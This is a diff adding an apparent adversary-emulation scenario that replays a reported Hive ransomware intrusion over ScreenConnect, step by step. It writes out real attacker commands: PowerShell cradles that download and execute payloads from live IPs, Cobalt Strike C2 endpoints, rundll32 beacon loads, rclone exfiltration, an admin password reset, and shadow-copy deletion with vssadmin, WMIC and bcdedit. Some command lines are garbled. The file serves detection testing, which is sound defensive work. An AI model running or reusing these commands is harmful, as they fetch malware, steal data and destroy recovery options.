@@ -1,0 +1,338 @@
+title "Hive Ransomware using ScreenConnect"
+description "In the October 2022 intrusion, a threat actor utilized a deceptive executable disguised as a document to gain initial access via a Remote Monitoring and Management (RMM) tool. After installing ScreenConnect, they performed reconnaissance, executed a Cobalt Strike beacon, and engaged in lateral movement through various techniques, including trojanizing ApacheBench and employing Impacket's wmiexec.py script. The actor dropped Mimikatz, extracted Active Directory data, and exfiltrated files over SFTP. Despite a failed attempt at domain-wide Hive ransomware deployment, manual executions successfully encrypted key servers. The time to ransomware (TTR) from initial access was 61 hours."
+author "Detecteam"
+
+reference "https://www.rapid7.com/blog/post/2023/01/11/increasing-the-sting-of-hive-ransomware/"
+reference "https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-321a"
+reference "https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/"
+reference "https://malpedia.caad.fkie.fraunhofer.de/details/win.hive"
+reference "https://arxiv.org/pdf/2202.08477.pdf"
+
+revision 2
+status "development"
+
+tag "category = ransomware"
+
+$user.name = "John Doe"
+$beachhead_ip = "10.0.0.1"
+
+tag "mitre-attack = T1219" # Remote Access Software 
+tag "mitre-attack = T1021.002" # SMB/Windows Admin Shares
+tag "mitre-attack = T1059.001" # PowerShell
+tag "mitre-attack = T1059.003" # Windows Command Shell 
+tag "mitre-attack = T1053.005" # Scheduled Task 
+tag "mitre-attack = T1569.002" # Service Execution 
+tag "mitre-attack = T1204.002" # Malicious File 
+tag "mitre-attack = T1047" # Windows Management Instrumentation 
+tag "mitre-attack = T1087.002" # Domain Account 
+tag "mitre-attack = T1087.001" # Local Account 
+tag "mitre-attack = T1069.002" # Domain Groups 
+tag "mitre-attack = T1055" # Process Injection 
+tag "mitre-attack = T1070.004" # File Deletion 
+tag "mitre-attack = T1027.010" # Command Obfuscation 
+tag "mitre-attack = T1218.007" # Msiexec 
+tag "mitre-attack = T1218.011" # Rundll32 
+tag "mitre-attack = T1003.001" # LSASS Memory 
+tag "mitre-attack = T1083" # File and Directory Discovery 
+tag "mitre-attack = T1135" # Network Share Discovery 
+tag "mitre-attack = T1082" # System Information Discovery 
+tag "mitre-attack = T1016" # System Network Configuration Discovery 
+tag "mitre-attack = T1033" # System Owner/User Discovery 
+tag "mitre-attack = T1570" # Lateral Tool Transfer 
+tag "mitre-attack = T1021.001" # Remote Desktop Protocol 
+tag "mitre-attack = T1071.001" # Web Protocols 
+tag "mitre-attack = T1105" # Ingress Tool Transfer 
+tag "mitre-attack = T1048.002" # Exfiltration Over Asymmetric Encrypted Non-C2 Protocol 
+tag "mitre-attack = T1486" # Data Encrypted for Impact 
+tag "mitre-attack = T1490" # Inhibit System Recovery 
+tag "mitre-attack = T1106" # Native API 
+tag "mitre-attack = T1543.003" # Windows Service 
+tag "mitre-attack = T1027.009" # Embedded Payloads 
+tag "mitre-attack = T1039" # Data from Network Shared Drive 
+tag "mitre-attack = T1001.003" # Protocol Impersonation 
+tag "mitre-attack = T1197" # BITS Jobs 
+tag "mitre-attack = T1571" # Non-Standard Port 
+tag "mitre-attack = T1005" # Data from Local System 
+tag "mitre-attack = T1531" # Account Access Removal 
+tag "mitre-attack = T1036.005" # Match Legitimate Name or Location 
+tag "mitre-attack = T1041" # Exfiltration Over C2 Channel 
+tag "mitre-attack = T1104" # Multi-Stage Channels 
+tag "mitre-attack = T1069" # Permission Groups Discovery 
+tag "mitre-attack = T1482" #Domain Trust Discovery
+tag "mitre-attack = T1027.007" # Dynamic API Resolution
+
+section start "Start" {}
+
+section day_01 "Day 1" {}
+
+section 1110UTC_Initial_execution_on_Beachhead "Initial execution on Beachhead" {
+    step initial_execution {
+        $process.command_line = """C:\Users\${user.name}\Downloads\document8765.exe"""
+        action Process.Start
+    }
+    sleep 4740
+}
+
+section 1229UTC_Discovery_ScreenConnect "Discovery via ScreenConnect" {
+    step cmd_screenconnect {
+        $process.command_line = """'cmd.exe' /c 'C:\Windows\TEMP\ScreenConnect\22.8.9717.8313\fa9f4f97-996e4753-9957-936eec5b7dlarun.cmd'"""
+        action Process.Start
+    }
+    $commands = [
+        "systeminfo",
+        "ipconfig/all",
+        "net group 'domain admins' /domain"
+    ]
+    loop $commands as $command {
+        step discovery_commands {
+            $process.command_line = $command
+            action Process.Start
+        }
+    }
+    sleep 180
+}
+
+section 1232UTC_Cobalt_Strike_Execution "Cobalt Strike Execution" {
+    $commands = [
+        """cmd.exe /c 'C:\Windows\TEMP\ScreenConnect\22.8.9717.8313\352a8d52-3f6d-4fe3-919c-lebabc5145cbrun.cmd'""",
+        """powershell.exe -nop -c "start-job { param(Sa) Import-Module BitsTransfer; $d = Senv:temp + '\'+ [System.IO.Path]:GetRandomFileName();Start-BitsTransfer -Source 'http://31.41.244.192:80/96945jgjf'-DestinationSd;St=[IO.File]:ReadAllText(Sd); Remove-Item $d; IEX St } -Argument 0 | wait-job | Receive-Job" """
+    ]
+
+    loop $commands as $command {
+        step cs_commands {
+            $process.command_line = $command
+            action Process.Start
+        }
+    }
+    sleep 240
+}
+
+section 1236UTC_Command_and_Control "Command and Control Cobalt Strike" {
+    $destination.ip = "31.41.244.192"
+    $destination.port = 80
+    step CS_connection {
+        run HTTPConnection
+    }
+    sleep 2520
+}
+
+section 1318UTC_Meterpreter_Execution "Meterpreter Execution" {
+    $commands = [
+        """cmd.exe/c "C:\Windows\TEMP\ScreenConnect\22.8.9717.8313\6142516f-9df2-40fa-b575-87f111d5641lrun.cmd"""",
+        """powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]:Tls12:$z="echo($env:temp+'\P6ngEdwk.exe')":(new-object System.Net.WebClient).DownloadFile('http://94.232.43.201:8080/dQhNZOV3Qm',$z): invoke-item $z"""
+        # Powerfun injected ApacheBench executable
+    ]
+    loop $commands as $command {
+        step meterpreter_commands {
+            $process.command_line = $command
+            action Process.Start
+        }
+    }
+    $ips = {
+        "94.232.43.201":"4433",
+        "94.232.43.201":"4444"
+    }
+    loop $ips as $item {
+        $destination.ip = key($item)
+        $destination.port = value($item)
+        step apache_bench {
+            run HTTPConnection
+        }
+    }
+    sleep 1620
+}
+
+
+section 1345UTC_Lateral_Movement_Persistence_and_Command_and_Control "Lateral Movement, Persistence and Command and Control" {
+    # Remote service created on server
+    # PowerShell beacon
+    
+    # Atera and Splashtop install
+    step atera_and_splashtop_install {
+    $process.command_line = """"C:\Windows\System32\msiexec.exe" /i "C:\programdata\setup.msi""""
+        action Process.Start
+    }
+    
+    # Bits-Transfer
+    step bits_transfer {
+        $process.command_line = """param($a) Import-Module BitsTransfer: $d =$env:temp + '\' + [System.IO.Pathl:•GetRandomFileName():Start-BitsTransfer-Source 'http://31.41.244.192:80/96945igif'-Destination $d:$t = [IO.Filel::ReadAllText(Sd);Remove-Item $d; IEX $t"""
+        action Process.Start
+    }
+    
+    $destination.ip = "31.41.244.192"
+    $destination.port = 80
+    step cs_connection {
+        run HTTPConnection
+    }
+    sleep 1200
+}
+
+
+
+section 1405UTC_Lateral_Movement_and_Discovery "Lateral Movement and Discovery" {
+    # Impacket wmiexec.py targeting fileshare
+    $_REDACTED = " " # ?????
+    $commands = [
+        """cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMINS\${_REDACTED} 2>&1""",
+        """cmd.exe /Q /c quser 1> \\127.0.0.1\ADMINS\${_REDACTED} 2>&1"""
+    ]
+    loop $commands as $command {
+        step lateral_movement_and_discovery {
+            $process.command_line = $command
+            action Process.Start
+        }
+    }
+    # Bits-Transfer
+    # Cobalt Strike beacon
+    sleep  35700
+}
+
+section day_2 "Day 2" {
+    sleep 24300
+}
+
+section 645UTC_credential_Dumping "Credential Dumping" {
+    # Mimikatz binary dropped and run on several
+    # servers and domain controllers via wmiexec.py
+    sleep 31340
+}
+
+
+section 1634UTC_Lateral_Movement_and_Execution "Lateral Movement and Execution" {
+    # New Cobalt Strike DLL beacons deployed throughout environment
+    $domain_controller = "LOCAL"
+    $commands = [
+        """cmd.exe /c rundl32.exe \\${domain_controller}\c$\ProgramData\c64.dll, DllRegisterServer""",
+        """cmd.exe /c rundll32.exe \\${domain_controller}\c$\ProgramData\×2.dll, DllRegisterServer"""
+    ]
+    loop $commands as $command {
+        step lateral_movement_and_execution {
+            $process.command_line = $command
+            action Process.Start
+        }
+    }
+    
+    $destination.ip = "23.108.57.83"
+    $destination.port = 443
+    $destination.domain = "sodiwugoc.com"
+    step cs_connection {
+        run HTTPConnection
+    }
+    sleep 4020
+   
+}
+
+
+
+section 1745UTC_Discovery "Discovery" {
+    $commands = [
+        "cmd.exe /C nltest /dclist:",
+       "cmd.exe /C net group 'Domain Computers' /domain",
+       "cmd.exe /C nltest /DOMAIN TRUSTS",
+       "cmd.exe /C time"
+   ]
+   loop $commands as $command {
+       step discovery_commands {
+           $process.command_line = $command
+           action Process.Start
+       }
+   }
+   sleep  15300 
+}
+
+section day_3 "Day 3" {
+    sleep 31080
+}
+
+section 838UTC_Discovery "More Discovery" {
+    $_REDACTED = " "
+    $REDACTED = " "
+   $commands = [
+        """cmd.exe /Q /c adcomp.bat 1> \\127.0.0.1\ADMINS\${_REDACTED} 2>&1""",
+        """powershellGet-ADComputer-Filter*-PropertiesName,Operatingsystem, OperatingSystemVersion,OperatingSystemServicePack,IPv4Address""",
+        """C:\Windows\system32\cmd.exe /C netping ${REDACTED} netping.txt"""
+    ]
+    loop $commands as $command {
+        step more_discovery_commands {
+            $process.command_line = $command
+            action Process.Start
+        }
+    }
+
+    sleep 44760
+}
+
+section 2104UTC_Lateral_Movement_and_Discovery "RDP Lateral Movement and Discovery" {
+    # RDP from compromised server to fileshare server using service account
+    # Threat actor browses shares over the RDP session
+    sleep 2640
+}
+
+section 2148UTC_Lateral_Movement "More RDP Lateral Movement" {
+    # RDP to backup server and checks backup settings
+    sleep 3540
+}
+
+
+section 2247UTC_Exfiltration "Exfiltration" {
+    # Threat actor connects to server over SSH with rclone to begin
+    # exfiltration from fileshare server
+    $REDACTED = "" # ??????
+    step exfiltration {
+        $process.command_line = """rclone copy "E:\${REDACTED}" DOMAIN:/mnt/sda/DOMAIN"""
+        action Process.Start
+    }
+    sleep 120
+}
+
+section 2249UTC_Discovery "Discovery via netscan" {
+    step netscan {
+        $process.command_line = """C:\ProgramData\netscan\netscan.exe"""
+        action Process.Start
+    }
+    sleep 4260
+}
+
+section day_4 "Day 4" {
+    sleep 2280
+}
+
+
+section 0038UTC_Impact "Impact" {
+    # Threat actor changes admin account password
+    $REDACTED = "" ##
+    step impact_net_user {
+        $process.command_line = """net user ${REDACTED} QWEasdZXCl"""
+        action Process.Start
+    }
+    sleep 300
+}
+
+section 0043UTC_Impact "More Impact" {
+    # Ransomware manually started on fileshare server
+    $REDACTED = ""
+    $commands = [
+        """C:\Windows\system32\cmd.exe /C windows_x64_encrypt.exe -U ${REDACTED}""",
+        """C:\Windows\Svstem32\ vssadmin.exe delete shadows /all /quiet""",
+        """C:\Windows\System32\wbem\WMIC.exe shadowcopy delete""",
+        """C:\Windows\System32\bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures"""
+    ]
+    loop $commands as $command {
+        step more_impact {
+            $process.command_line = $command
+            action Process.Start
+        }
+    }
+    # Ransomware executed manually on several other servers
+    sleep 600
+}
+
+section 0053UTC_Impact "More and more Impact" {
+    # Threat actor works to create GPO to deploy ransomware to rest of domain 
+    # using a GPO to push a scheduled task to run the ransomware from a network
+    # share on domain joined hosts GPO was misconfigured resulting in 
+    # encryption only on manually ransomed machines
+}
+
+
+section end "End" {}
